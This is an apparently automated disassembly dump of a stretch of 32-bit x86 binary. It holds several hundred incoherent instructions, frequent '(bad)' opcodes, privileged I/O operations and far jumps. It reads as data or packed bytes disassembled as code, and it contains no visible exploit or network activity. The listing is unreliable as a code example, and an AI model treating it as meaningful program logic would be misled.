  40e17d:	cmp    eax,0xa543b086
  40e182:	mov    bl,0x99
  40e184:	sti    
  40e185:	out    dx,eax
  40e186:	xchg   ecx,eax
  40e187:	xlat   BYTE PTR ds:[ebx]
  40e188:	inc    ecx
  40e189:	icebp  
  40e18a:	cli    
  40e18b:	or     esi,edx
  40e18d:	cdq    
  40e18e:	mov    BYTE PTR [eax+0x75],ah
  40e191:	mov    ah,0x8b
  40e193:	int    0xfc
  40e195:	sub    eax,0xb7138268
  40e19a:	stos   DWORD PTR es:[edi],eax
  40e19b:	xchg   ebx,eax
  40e19c:	or     esi,esp
  40e19e:	add    eax,0x5f5b6d73
  40e1a3:	pusha  
  40e1a4:	ret    0xf335
  40e1a7:	pop    ebp
  40e1a8:	rcr    DWORD PTR [ebp-0x54],cl
  40e1ab:	int3   
  40e1ac:	mov    eax,ds:0x8b05c68c
  40e1b1:	mov    ds:0xfc9f2ad1,eax
  40e1b6:	pop    edi
  40e1b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1b8:	aaa    
  40e1b9:	add    eax,0xd19a73fe
  40e1be:	xchg   edx,eax
  40e1bf:	cmp    al,bl
  40e1c1:	pop    edi
  40e1c2:	int3   
  40e1c3:	xchg   esp,eax
  40e1c4:	add    al,BYTE PTR [edx]
  40e1c6:	lock adc DWORD PTR [esi+ebp*2],ebp
  40e1ca:	jp     0x40e1ef
  40e1cc:	sbb    BYTE PTR [ebp-0x7a34ce6a],bh
  40e1d2:	es mov ebx,0xdf2d01
  40e1d8:	jmp    0x60a6b4de
  40e1dd:	or     al,0x1
  40e1df:	ret    
  40e1e0:	mov    dl,0x4f
  40e1e2:	clc    
  40e1e3:	adc    bh,cl
  40e1e5:	(bad)  
  40e1e6:	popa   
  40e1e7:	xchg   esp,eax
  40e1e8:	mov    ds:0xdcbc5e38,al
  40e1ed:	fnsave [eax+0x212a535b]
  40e1f3:	jp     0x40e1d2
  40e1f5:	into   
  40e1f6:	xor    eax,0xc281a5a6
  40e1fb:	dec    edx
  40e1fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1fd:	cli    
  40e1fe:	idiv   DWORD PTR [ebp+eiz*4-0x37]
  40e202:	add    ecx,DWORD PTR [ebp-0x2da1c869]
  40e208:	mov    edi,cs
  40e20a:	and    eax,0xf4ee1fe0
  40e20f:	or     cl,0x21
  40e212:	(bad)  
  40e213:	pop    ss
  40e214:	add    esi,DWORD PTR [eax]
  40e216:	cmp    eax,0x28f889ef
  40e21b:	sbb    ecx,DWORD PTR [ebx]
  40e21d:	xchg   DWORD PTR [eax-0x70],edi
  40e220:	inc    ebx
  40e221:	outs   dx,BYTE PTR ds:[esi]
  40e222:	pop    ds
  40e223:	ss adc eax,0xd3c0fb8e
  40e229:	loopne 0x40e27d
  40e22b:	repz popa 
  40e22d:	adc    ecx,esi
  40e22f:	jmp    0x40e26f
  40e231:	cld    
  40e232:	shl    ecx,cl
  40e234:	mov    al,0x15
  40e236:	cmp    ebx,DWORD PTR [edx-0x30]
  40e239:	jae    0x40e1fd
  40e23b:	push   eax
  40e23c:	xor    ecx,DWORD PTR [eax]
  40e23e:	adc    BYTE PTR [ebp+0x28f280e5],dl
  40e244:	in     al,dx
  40e245:	dec    ebp
  40e246:	popa   
  40e247:	sbb    ecx,DWORD PTR [ebp+0x4c]
  40e24a:	jnp    0x40e26c
  40e24c:	cmp    al,0x42
  40e24e:	inc    esp
  40e24f:	pop    eax
  40e250:	out    dx,eax
  40e251:	push   eax
  40e252:	movhlps xmm5,xmm5
  40e255:	dec    ebp
  40e256:	cld    
  40e257:	das    
  40e258:	aam    0x31
  40e25a:	stos   BYTE PTR es:[edi],al
  40e25b:	mov    ds:0x75a52c82,al
  40e260:	add    al,0xef
  40e262:	xlat   BYTE PTR ds:[ebx]
  40e263:	test   BYTE PTR [edi+ecx*2+0x3b],al
  40e267:	xor    bl,BYTE PTR [ebp+0x57]
  40e26a:	jbe    0x40e2ba
  40e26c:	sbb    edx,DWORD PTR [ecx-0x2786d9a4]
  40e272:	aaa    
  40e273:	cdq    
  40e274:	mov    ecx,0x75521ab4
  40e279:	fcomp  QWORD PTR [ecx+0x4c06eb69]
  40e27f:	pop    edi
  40e280:	stos   BYTE PTR es:[edi],al
  40e281:	inc    esp
  40e282:	sbb    edi,esi
  40e284:	loop   0x40e28a
  40e286:	jnp    0x40e23c
  40e288:	cdq    
  40e289:	test   eax,0x1046993b
  40e28e:	repz daa 
  40e290:	rcl    DWORD PTR [esi-0x12],1
  40e293:	add    DWORD PTR [ecx+0x70],edx
  40e296:	in     eax,0xdb
  40e298:	rcl    ah,1
  40e29a:	arpl   WORD PTR [ebp-0x2c],sp
  40e29d:	in     eax,dx
  40e29e:	add    ecx,ecx
  40e2a0:	xor    BYTE PTR [edi],bl
  40e2a2:	inc    esp
  40e2a3:	bound  edx,QWORD PTR [edx]
  40e2a5:	fld    DWORD PTR [ebx+0x4a60c495]
  40e2ab:	nop
  40e2ac:	data16 xlat BYTE PTR ds:[ebx]
  40e2ae:	xchg   DWORD PTR [ebp+0x2c],edi
  40e2b1:	call   0x2023:0x1dd7d4af
  40e2b8:	xor    al,0x57
  40e2ba:	push   ds
  40e2bb:	fisubr WORD PTR [ecx-0xfda4709]
  40e2c1:	xor    dh,BYTE PTR [ecx+eax*4-0x41]
  40e2c5:	in     al,dx
  40e2c6:	mov    al,ds:0x1b926b6d
  40e2cb:	mov    eax,0x687433e7
  40e2d0:	or     al,BYTE PTR [ecx+eiz*1+0x24]
  40e2d4:	inc    ebp
  40e2d5:	stos   BYTE PTR es:[edi],al
  40e2d6:	adc    esi,eax
  40e2d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2d9:	nop
  40e2da:	pushf  
  40e2db:	add    dl,bh
  40e2dd:	loope  0x40e2a3
  40e2df:	jl     0x40e337
  40e2e1:	ins    BYTE PTR es:[edi],dx
  40e2e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2e3:	mov    edx,edx
  40e2e5:	sub    ch,BYTE PTR [ebp-0x7310d981]
  40e2eb:	into   
  40e2ec:	enter  0xc577,0xd9
  40e2f0:	push   ds
  40e2f1:	mov    ds:0xfe2bca54,eax
  40e2f6:	sar    BYTE PTR [ebx+0x35],cl
  40e2f9:	xchg   ebp,eax
  40e2fa:	ficom  WORD PTR cs:[edx]
  40e2fd:	xlat   BYTE PTR ds:[ebx]
  40e2fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e2ff:	mul    DWORD PTR [esi-0x1a5565ed]
  40e305:	mov    dl,0x52
  40e307:	xchg   ecx,eax
  40e308:	test   al,0xed
  40e30a:	hlt    
  40e30b:	mov    cl,bl
  40e30d:	call   0x323c:0x1ef2195b
  40e314:	add    BYTE PTR [edi-0x7c02e7cf],cl
  40e31a:	sub    al,0x55
  40e31c:	cld    
  40e31d:	sbb    ecx,DWORD PTR [ebx+0x7e]
  40e320:	adc    al,0x22
  40e322:	je     0x40e2f3
  40e324:	ins    BYTE PTR es:[edi],dx
  40e325:	and    al,0x2f
  40e328:	inc    esp
  40e329:	icebp  
  40e32a:	add    eax,0xe4c3af48
  40e32f:	inc    ebx
  40e330:	aaa    
  40e331:	adc    BYTE PTR [esi+0x2297ebc8],dl
  40e337:	sbb    dl,BYTE PTR [edx+0x37]
  40e33a:	cmp    DWORD PTR [ebx-0x4a],edi
  40e33d:	sbb    DWORD PTR [ecx],eax
  40e33f:	ss mov eax,0x357b9486
  40e345:	mov    al,ds:0xebd23c99
  40e34a:	or     al,0xba
  40e34c:	cli    
  40e34d:	mov    dh,0xca
  40e34f:	ss mov esi,0xadb28d76
  40e355:	(bad)  
  40e357:	mov    ebp,0xe80a73ba
  40e35c:	out    dx,al
  40e35d:	push   ss
  40e35e:	daa    
  40e35f:	shl    DWORD PTR [ebx],cl
  40e361:	jl     0x40e392
  40e363:	scas   al,BYTE PTR es:[edi]
  40e364:	adc    dl,BYTE PTR [esi-0x4c]
  40e367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e368:	mov    dl,0x84
  40e36a:	js     0x40e3b2
  40e36c:	inc    esp
  40e36d:	mov    ch,BYTE PTR [edi-0x33]
  40e370:	scas   eax,DWORD PTR es:[edi]
  40e371:	add    BYTE PTR [edi-0x70ddacdf],al
  40e377:	inc    edi
  40e378:	pop    eax
  40e379:	mov    esp,0x54b7252f
  40e37e:	retf   0x3224
  40e381:	fist   WORD PTR [ebp-0x61]
  40e384:	daa    
  40e385:	arpl   WORD PTR [ecx+0x3f31b8d6],cx
  40e38b:	and    dh,0xcf
  40e38e:	clc    
  40e38f:	mov    ebx,0x20fd6895
  40e394:	lods   eax,DWORD PTR ds:[esi]
  40e395:	jo     0x40e356
  40e397:	add    cl,BYTE PTR [ebx-0x72]
  40e39a:	test   eax,0x9ea71339
  40e39f:	inc    ebp
  40e3a0:	lea    ebx,[ecx-0x54]
  40e3a3:	adc    al,0x0
  40e3a5:	fsubrp st(5),st
  40e3a7:	adc    ch,bl
  40e3a9:	inc    eax
  40e3aa:	pop    ds
  40e3ab:	js     0x40e3a1
  40e3ad:	jnp    0x40e3c1
  40e3af:	fcom   QWORD PTR [edi+ecx*2-0x29]
  40e3b3:	mov    WORD PTR [esi-0x47bb0d37],es
  40e3b9:	cmc    
  40e3ba:	lods   eax,DWORD PTR ds:[esi]
  40e3bb:	retf   0xf54f
  40e3be:	test   BYTE PTR ds:0x8fb7886c,cl
  40e3c4:	shr    DWORD PTR [ecx-0x30806758],cl
  40e3ca:	mov    ds:0x5e2d75eb,eax
  40e3cf:	push   ebx
  40e3d0:	idiv   edi
  40e3d2:	iret   
  40e3d3:	arpl   WORD PTR [ebp-0x3e28663c],bp
  40e3d9:	call   0xeb76e7f2
  40e3de:	daa    
  40e3df:	xlat   BYTE PTR ds:[ebx]
  40e3e0:	sub    ebp,ecx
  40e3e2:	cmp    esp,ebp
  40e3e4:	cs xchg edx,eax
  40e3e6:	jmp    0x5f9b:0x6bd047c3
  40e3ed:	inc    esp
  40e3ee:	scas   eax,DWORD PTR es:[edi]
  40e3ef:	mov    dl,0x5f
  40e3f1:	scas   eax,DWORD PTR es:[edi]
  40e3f2:	add    BYTE PTR [edi],bh
  40e3f4:	sbb    BYTE PTR [ebx-0x39],dl
  40e3f7:	jle    0x40e38f
  40e3f9:	ret    0x36fa
  40e3fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3fd:	(bad)  
  40e3ff:	and    al,BYTE PTR [ebx]
  40e401:	mov    DWORD PTR [edi+0x3439da27],ebp
  40e407:	fldcw  WORD PTR [edx+0x7c9e5b30]
  40e40d:	test   al,dl
  40e40f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e410:	stos   DWORD PTR es:[edi],eax
  40e411:	repnz dec edi
  40e413:	jnp    0x40e483
  40e415:	mov    al,ds:0x8e705a4
  40e41a:	cld    
  40e41b:	ret    0x6632
  40e41e:	into   
  40e41f:	pop    ebp
  40e420:	sub    DWORD PTR fs:[edi+0x34],esi
  40e424:	aam    0x87
  40e426:	in     eax,0x64
  40e428:	xchg   DWORD PTR [ecx-0x73a19b96],ecx
  40e42e:	add    al,0xbe
  40e430:	les    ebp,FWORD PTR [edx]
  40e432:	cmc    
  40e433:	lahf   
  40e434:	xchg   ebp,eax
  40e435:	aaa    
  40e436:	addr16 or al,ah
  40e439:	cmp    eax,0xfa4accdb
  40e43e:	int    0x72
  40e440:	mov    bl,0x7e
  40e442:	(bad)
  40e445:	ins    DWORD PTR es:[edi],dx
  40e446:	mov    DWORD PTR [ebp-0x4c],edi
  40e449:	(bad)  [eax]
  40e44b:	xlat   BYTE PTR ds:[ebx]
  40e44c:	mov    es,WORD PTR [ebp+edx*4+0x40]
  40e450:	gs jo  0x40e418
  40e453:	or     bl,BYTE PTR [edx-0x16]
  40e456:	xchg   BYTE PTR [esi+0x3b],ch
  40e459:	add    eax,0x8b5e05c7
  40e45e:	xchg   ebp,eax
  40e45f:	inc    esi
  40e460:	fs inc ebp
  40e462:	retf   
  40e463:	mov    dh,0x23
  40e465:	out    0x72,eax
  40e467:	das    
  40e468:	sbb    ebp,DWORD PTR [ecx+esi*8-0x6a]
  40e46c:	mov    ds:0xccee4a1c,al
  40e471:	retf   
  40e472:	mov    al,ds:0x8fd2deaf
  40e477:	ss jge 0x40e41a
  40e47a:	mov    al,BYTE PTR ds:0xa9881165
  40e480:	fbstp  TBYTE PTR [edx-0x77019a4f]
  40e486:	cmp    eax,DWORD PTR [ebx+0x61f9448c]
  40e48c:	pop    es
  40e48d:	mov    ds:0x1b5b404a,eax
  40e492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e493:	mov    eax,0x92d14d08
  40e498:	stc    
  40e499:	daa    
  40e49a:	outs   dx,BYTE PTR ds:[esi]
  40e49b:	and    eax,0xacc81a69
  40e4a0:	jp     0x40e453
  40e4a2:	div    BYTE PTR [edx-0x36]
  40e4a5:	jb     0x40e50f
  40e4a7:	(bad)  
  40e4a8:	dec    edx
  40e4a9:	in     al,0x3b
  40e4ab:	inc    edx
  40e4ac:	fld    TBYTE PTR [edx]
  40e4ae:	xchg   esp,eax
  40e4af:	lea    ebp,[eax-0x3174a296]
  40e4b5:	pop    ecx
  40e4b6:	retf   
  40e4b7:	sub    cl,BYTE PTR ds:0xe0b8f3d2
  40e4bd:	or     ecx,DWORD PTR [edx]
  40e4bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4c0:	xchg   edx,eax
  40e4c1:	or     DWORD PTR [ecx-0x4d],eax
  40e4c4:	ins    DWORD PTR es:[edi],dx
  40e4c5:	mov    edi,0xdc069194
  40e4ca:	mov    ebp,0xa3b057b8
  40e4cf:	jle    0x40e48c
  40e4d1:	neg    BYTE PTR [ecx+ebp*8+0x73307c6a]
  40e4d8:	and    DWORD PTR [eax+0x19],0x5b
  40e4dc:	push   ecx
  40e4dd:	sahf   
  40e4de:	les    ecx,FWORD PTR [edx+0x6cf4d0b4]
  40e4e4:	or     eax,0x84ae1939
  40e4e9:	mov    WORD PTR [edi-0x48],?
  40e4ec:	leave  
  40e4ed:	das    
  40e4ee:	in     al,0xcf
  40e4f0:	pop    es
  40e4f1:	sbb    bh,BYTE PTR [edi]
  40e4f3:	clc    
  40e4f4:	inc    eax
  40e4f5:	xor    bl,bl
  40e4f7:	mov    ds,WORD PTR [ebp-0xbf23af2]
  40e4fd:	sar    BYTE PTR [ebp-0x57137a92],cl
  40e503:	ja     0x40e503
  40e505:	retf   0x49db
  40e508:	arpl   WORD PTR [ebx],bx
  40e50a:	add    esp,esi
  40e50c:	adc    esi,ecx
  40e50e:	pop    bx
  40e510:	push   ecx
  40e511:	xor    dh,0x6
  40e514:	mov    WORD PTR [edx-0x1b],gs
  40e517:	inc    edx
  40e518:	inc    esi
  40e519:	hlt    
  40e51a:	lea    ebx,[ebx-0x12]
  40e51d:	sbb    DWORD PTR [eax-0x61],eax
  40e520:	jge    0x40e55b
  40e522:	mov    ah,0xda
  40e524:	jbe    0x40e4f6
  40e526:	mov    esp,0xcba39f4c
  40e52b:	mov    DWORD PTR [edx-0x2a],ebp
  40e52e:	or     al,0x54
  40e530:	cmp    DWORD PTR [ebx],ecx
  40e532:	push   edx
  40e533:	mov    ebx,0x83ca8a50
  40e538:	(bad)  
  40e539:	arpl   sp,di
  40e53b:	mov    esi,0x7e3aeb3f
  40e540:	fs pop edx
  40e542:	mov    ds:0x6e5a106d,al
  40e547:	cmp    al,0xda
  40e549:	aas    
  40e54a:	(bad)  
  40e54b:	fwait
  40e54c:	pop    ss
  40e54d:	(bad)  
  40e54e:	mov    ebp,0x64868417
  40e553:	(bad)  
  40e555:	xchg   esi,eax
  40e556:	add    eax,0xcb029679
  40e55b:	mov    dh,0xb7
  40e55d:	pop    edi
  40e55e:	add    DWORD PTR [edx-0x6f],ebx
  40e561:	adc    DWORD PTR [esi+0x219f280b],ebx
  40e567:	xchg   ebx,eax
  40e568:	push   ebp
  40e569:	and    eax,0x46c896b8
  40e56e:	mov    edx,0x3376be8d
  40e573:	addr16 adc eax,0xdfeb99af
  40e579:	es and eax,0x1b6a9d98
  40e57f:	call   FWORD PTR [eax]
  40e581:	pop    esp
  40e582:	sub    eax,0x8b1f6b68
  40e587:	sar    DWORD PTR [ebp-0x5094f9e6],0xc6
  40e58e:	out    dx,al
  40e58f:	lds    eax,FWORD PTR [eax]
  40e591:	repz sub dh,bh
  40e594:	(bad)  
  40e595:	fwait
  40e596:	popa   
  40e597:	mov    WORD PTR ds:0x7612f61a,gs
  40e59d:	lock inc edi
  40e59f:	cmp    al,0x19
  40e5a1:	lods   eax,DWORD PTR ds:[esi]
  40e5a2:	sub    edx,ecx
  40e5a4:	sub    bh,BYTE PTR [ebx+0x64]
  40e5a7:	jle    0x40e599
  40e5a9:	das    
  40e5aa:	jmp    0xd10f:0xd239e182
  40e5b1:	fwait
  40e5b2:	and    al,0xfc
  40e5b4:	mov    ah,0x53
  40e5b6:	outs   dx,BYTE PTR fs:[esi]
  40e5b8:	cmp    DWORD PTR ds:0x18393855,0xf19f7759
  40e5c2:	gs dec ebx
  40e5c4:	jge    0x40e549
  40e5c6:	popa   
  40e5c7:	out    0x1d,eax
  40e5c9:	pop    ds
  40e5ca:	pop    esi
  40e5cb:	jle    0x40e5a0
  40e5cd:	jbe    0x40e5d5
  40e5cf:	xor    BYTE PTR [edx+0x3c065306],dl
  40e5d5:	sbb    DWORD PTR ds:0xb1456f3b,eax
  40e5db:	adc    esi,DWORD PTR [eax+0x454f4b59]
  40e5e1:	aam    0x77
  40e5e3:	mov    BYTE PTR [esi+0x37],bh
  40e5e6:	pop    ds
  40e5e7:	into   
  40e5e8:	adc    al,BYTE PTR [edi+0x26]
  40e5eb:	retf   
  40e5ec:	fisubr WORD PTR [edx+0xf355219]
  40e5f2:	jmp    0x40e5b8
  40e5f4:	stc    
  40e5f5:	pop    eax
  40e5f6:	and    esp,ecx
  40e5f8:	jge    0x40e5d1
  40e5fa:	(bad)  
  40e5fb:	inc    ebp
  40e5fc:	test   DWORD PTR [eax-0x643208e6],ebp
  40e602:	xor    edi,edx
  40e604:	mov    al,fs:0x31c8c311
  40e60a:	mov    WORD PTR [esi+0x10],ds
  40e60d:	das    
  40e60e:	lds    edx,FWORD PTR [ebx-0x5b]
  40e611:	popf   
  40e612:	mov    eax,ds:0x2aae0016
  40e617:	inc    esi
  40e618:	jne    0x40e609
  40e61a:	add    eax,0xf122f6a2
  40e61f:	pop    eax
  40e620:	and    eax,0x8b2ae7b5
  40e625:	hlt    
  40e626:	ficomp DWORD PTR [eax+eiz*4+0x296547a4]
  40e62d:	adc    bh,BYTE PTR [esi]
  40e62f:	mov    eax,edx
  40e631:	sbb    bl,BYTE PTR [ebp-0xe88f7ed]
  40e637:	ss xchg ebx,eax
  40e639:	adc    al,0xf6
  40e63b:	pop    edi
  40e63c:	jns    0x40e61b
  40e63e:	jo     0x40e68e
  40e640:	aad    0x5c
  40e642:	push   esp
  40e643:	and    BYTE PTR [ebp-0x1397352c],0x2d
  40e64a:	dec    esi
  40e64b:	pop    esi
  40e64c:	mov    eax,0x3d299333
  40e651:	ins    DWORD PTR es:[edi],dx
  40e652:	cmp    DWORD PTR [edx+edi*1-0x31f851a3],edx
  40e659:	mov    cl,0x3d
  40e65b:	bound  eax,QWORD PTR [ecx+0x56e132fc]
  40e661:	loop   0x40e614
  40e663:	aam    0x7a
  40e665:	fs retf 0xc94a
  40e669:	jb     0x40e6de
  40e66b:	add    al,0xbc
  40e66d:	and    edx,DWORD PTR [edx-0x402c4b22]
  40e673:	cmp    eax,0x24586007
  40e678:	inc    ebp
  40e679:	inc    esi
  40e67a:	in     eax,dx
  40e67b:	and    eax,0x63652bca
  40e680:	ror    DWORD PTR [ecx+0x462cdb9b],1
  40e686:	fstp   QWORD PTR [ecx]
  40e688:	ins    DWORD PTR es:[edi],dx
  40e689:	iret   
  40e68a:	ret    
  40e68b:	pushf  
  40e68c:	retf   
  40e68d:	(bad)  
  40e68f:	or     eax,0xe6cfe499
  40e694:	dec    esi
  40e695:	test   BYTE PTR [ebp+0x44245170],ch
  40e69b:	mov    edi,0x8cbc7faa
  40e6a0:	sbb    eax,0x3c00e960
  40e6a5:	loop   0x40e71d
  40e6a7:	push   ecx
  40e6a8:	pusha  
  40e6a9:	sbb    DWORD PTR [ebx-0x76],edx
  40e6ac:	lods   eax,DWORD PTR ds:[esi]
  40e6ad:	xchg   esp,eax
  40e6ae:	dec    edx
  40e6af:	sbb    dl,BYTE PTR [esi-0x14a69cc4]
  40e6b5:	jg     0x40e6ac
  40e6b7:	mov    bh,0xb1
  40e6b9:	mov    cl,0xe6
  40e6bb:	ficom  WORD PTR [ebx+eax*2+0x5a]
  40e6bf:	and    al,0xe5
  40e6c1:	popf   
  40e6c2:	in     al,0xb9
  40e6c4:	mov    al,0xc2
  40e6c6:	daa    
  40e6c7:	sub    dl,BYTE PTR [eax+0x60]
  40e6ca:	(bad)  
  40e6cc:	out    0xf4,al
  40e6ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6cf:	mul    BYTE PTR [edi]
  40e6d1:	in     al,0x3d
  40e6d3:	adc    DWORD PTR [esp+eiz*8+0x65dcbc0],ebp
  40e6da:	in     al,dx
  40e6db:	xchg   edx,eax
  40e6dc:	sub    bl,ch
  40e6de:	into   
  40e6df:	dec    edx
  40e6e0:	sbb    BYTE PTR [esi],bl
  40e6e2:	stos   DWORD PTR es:[edi],eax
  40e6e3:	xchg   DWORD PTR [esi],esp
  40e6e5:	or     DWORD PTR [ecx+0x16],edx
  40e6e8:	fmul   st(0),st
  40e6ea:	add    esp,DWORD PTR [esi-0x46d23dab]
  40e6f0:	mov    al,0x3b
  40e6f2:	call   0x76544ee2
  40e6f7:	xchg   edi,eax
  40e6f8:	mov    al,0x87
  40e6fa:	xchg   DWORD PTR [ebp+0x4],edi
  40e6fd:	ins    DWORD PTR es:[edi],dx
  40e6fe:	mov    cs,ebp
  40e700:	cmc    
  40e701:	loop   0x40e6e7
  40e703:	add    eax,0xeb7298e6
  40e708:	mov    bh,0xba
  40e70a:	aas    
  40e70b:	or     DWORD PTR [eax-0x3c414e8f],esp
  40e711:	ss adc eax,0x28e7433d
  40e717:	(bad)  
  40e718:	mov    eax,ds:0xaa131262
  40e71d:	fwait
  40e71e:	add    BYTE PTR [eax],ah
  40e720:	pusha  
  40e721:	enter  0xed0a,0x5f
  40e725:	cmp    al,0xc
  40e727:	rcl    DWORD PTR [edi-0x30e02618],0x61
  40e72e:	mov    ebx,0x1e0e03af
  40e733:	test   eax,0x679dccac
  40e738:	sub    ch,BYTE PTR [esi]
  40e73a:	hlt    
  40e73b:	mov    DWORD PTR [esi+0x52],ebx
  40e73e:	fst    DWORD PTR [esp+edx*1+0x4f7061bc]
  40e745:	xchg   DWORD PTR [esi-0x15],edi
  40e748:	mov    ds:0x9f207547,al
  40e74d:	xchg   BYTE PTR [ebx],bl
  40e74f:	iret   
  40e750:	data16 out dx,al
  40e752:	pop    ss
  40e753:	into   
  40e754:	and    DWORD PTR [ecx+0x5c7c0eeb],eax
  40e75a:	mov    edx,0x76c2157b
  40e75f:	fnclex 
  40e761:	xchg   edi,eax
  40e762:	mov    bl,0x48
  40e764:	xchg   ebp,eax
  40e765:	dec    DWORD PTR [eax]
  40e767:	out    dx,eax
  40e768:	ins    DWORD PTR es:[edi],dx
  40e769:	cmp    ebx,DWORD PTR [esi+0x1a]
  40e76c:	scas   al,BYTE PTR es:[edi]
  40e76d:	xor    al,0x6f
  40e76f:	xor    ebp,esi
  40e771:	xor    eax,0x5f530753
  40e776:	arpl   WORD PTR [edi+eiz*8+0x51b294cb],di
  40e77d:	push   edx
  40e77e:	jno    0x40e799
  40e780:	addr16 dec edi
  40e782:	les    ebx,FWORD PTR [esi+0x428324f]
  40e788:	sub    ch,bl
  40e78a:	gs addr16 ret 
  40e78d:	loopne 0x40e7ed
  40e78f:	loopne 0x40e72f
  40e791:	push   0x2ecc58d
  40e796:	lods   eax,DWORD PTR ds:[esi]
  40e797:	mov    cl,0x44
  40e799:	adc    BYTE PTR [ecx-0x21c72ac8],dl
  40e79f:	test   DWORD PTR [ecx],0x81080f59
  40e7a5:	dec    edi
  40e7a6:	push   ds
  40e7a7:	dec    edx
  40e7a8:	rcl    BYTE PTR [edx-0x1171b25],cl
  40e7ae:	mov    ss,WORD PTR [edi-0x5c]
  40e7b1:	in     eax,0xce
  40e7b3:	push   cs
  40e7b4:	int3   
  40e7b5:	lods   eax,DWORD PTR ds:[esi]
  40e7b6:	stc    
  40e7b7:	stc    
  40e7b8:	clc    
  40e7b9:	addr16 sbb bh,dh
  40e7bc:	dec    ebp
  40e7bd:	loop   0x40e81d
  40e7bf:	mov    al,ds:0xce43e0f3
  40e7c4:	cld    
  40e7c5:	fbstp  TBYTE PTR [ebx]
  40e7c7:	xor    BYTE PTR [edi+0x19],dh
  40e7ca:	xchg   esi,eax
  40e7cb:	mov    edi,0x8391b8da
  40e7d0:	stos   DWORD PTR es:[edi],eax
  40e7d1:	imul   DWORD PTR [edx]
  40e7d3:	pop    ss
  40e7d4:	add    al,0xe7
  40e7d6:	push   cs
  40e7d7:	push   ds
  40e7d8:	or     al,0xd
  40e7da:	dec    ebp
  40e7db:	mov    dl,0x86
  40e7dd:	add    DWORD PTR [edx],edx
  40e7df:	fwait
  40e7e0:	popf   
  40e7e1:	mov    cl,0x8a
  40e7e3:	xor    BYTE PTR [edx],dl
  40e7e5:	mov    bh,0xe3
  40e7e7:	xchg   edi,eax
  40e7e8:	dec    edi
  40e7e9:	jecxz  0x40e76b
  40e7eb:	cmp    BYTE PTR [ebx],al
  40e7ed:	out    dx,al
  40e7ee:	shl    BYTE PTR [ebx-0x6f],cl
  40e7f1:	xchg   edi,eax
  40e7f2:	or     ah,BYTE PTR [eax+0x38]
  40e7f5:	mov    ecx,0x59644396
  40e7fa:	dec    edi
  40e7fb:	lods   eax,DWORD PTR ds:[esi]
  40e7fc:	push   cs
  40e7fd:	jg     0x40e80a
  40e7ff:	add    edx,DWORD PTR [edx-0x75]
  40e802:	xor    esp,DWORD PTR [edi]
  40e804:	clc    
  40e805:	dec    edx
  40e806:	in     al,dx
  40e807:	add    eax,0x7abc8877
  40e80c:	ret    0xc996
  40e80f:	arpl   WORD PTR [bx+si+0x5e16],sp
  40e814:	stc    
  40e815:	stos   DWORD PTR es:[edi],eax
  40e816:	je     0x40e831
  40e818:	adc    BYTE PTR [ebx+0x62cb31d7],0x13
  40e81f:	ror    BYTE PTR [ebx-0x4753e19c],cl
  40e825:	mov    eax,ds:0x4e70eacd
  40e82a:	div    BYTE PTR [esi]
  40e82c:	lods   eax,DWORD PTR fs:[esi]
  40e82e:	sub    al,BYTE PTR [esi+eax*4-0x43]
  40e832:	or     DWORD PTR [esi+eax*1+0x36],ecx
  40e836:	jbe    0x40e83d
  40e838:	inc    DWORD PTR ds:0x3f47e9c3
  40e83e:	xor    ah,BYTE PTR [edi+0x37]
  40e841:	sub    al,0xee
  40e843:	cmp    DWORD PTR [esi+0x12d21e75],0x1e839acd
  40e84d:	retf   
  40e84e:	scas   eax,DWORD PTR es:[edi]
  40e84f:	xchg   edi,eax
  40e850:	pusha  
  40e851:	sub    DWORD PTR [edx],eax
  40e853:	push   ecx
  40e854:	cmp    ch,BYTE PTR [edi-0x73]
  40e857:	pop    ebx
  40e858:	loopne 0x40e889
  40e85a:	mov    ecx,0x20cbcfda
  40e85f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e860:	scas   al,BYTE PTR es:[edi]
  40e861:	push   eax
  40e862:	icebp  
  40e863:	lds    esi,FWORD PTR [edx-0x54]
  40e866:	mov    al,0x78
  40e868:	and    bh,ch
  40e86a:	es in  eax,dx
  40e86c:	je     0x40e82e
  40e86e:	xor    al,0xe3
  40e870:	(bad)  [ebx+0x6233e1c3]
  40e876:	fisubr WORD PTR [edi-0x72]
  40e879:	out    0xd0,eax
  40e87b:	stos   DWORD PTR es:[edi],eax
  40e87c:	pop    ss
  40e87d:	inc    ebx
  40e87e:	jo     0x40e873
  40e880:	out    0xef,al
  40e882:	xabort 0xa3
  40e885:	and    eax,0xca1c55a1
  40e88a:	cmp    esi,DWORD PTR [ecx-0x251cc1d9]
  40e890:	mov    ch,0xe7
  40e892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e893:	mov    al,0x76
  40e895:	push   ds
  40e896:	xor    DWORD PTR [ecx-0x77d7144f],esi
  40e89c:	mov    al,0xe7
  40e89e:	add    BYTE PTR [ebx+0x1d],bl
  40e8a1:	iret   
  40e8a2:	out    0x1b,eax
  40e8a4:	arpl   WORD PTR ds:0xd8967ce4,bx
  40e8aa:	int    0xcc
  40e8ac:	out    0x9e,eax
  40e8ae:	mov    ds:0x35801721,eax
  40e8b3:	mov    eax,0x324f2218
  40e8b8:	adc    BYTE PTR [ebx],bh
  40e8ba:	jo     0x40e934
  40e8bc:	sbb    al,0xbc
  40e8be:	sbb    ah,dh
  40e8c0:	in     eax,0xeb
  40e8c2:	dec    ebp
  40e8c3:	outs   dx,DWORD PTR ds:[esi]
  40e8c4:	or     al,0x8a
  40e8c6:	popf   
  40e8c7:	push   ebx
  40e8c8:	cld    
  40e8c9:	cmp    eax,0xd063e6e3
  40e8ce:	sbb    al,0xa1
  40e8d0:	arpl   WORD PTR [eax+0x1794cb39],cx
  40e8d6:	call   0x1c2181d1
  40e8db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8dc:	add    bl,dl
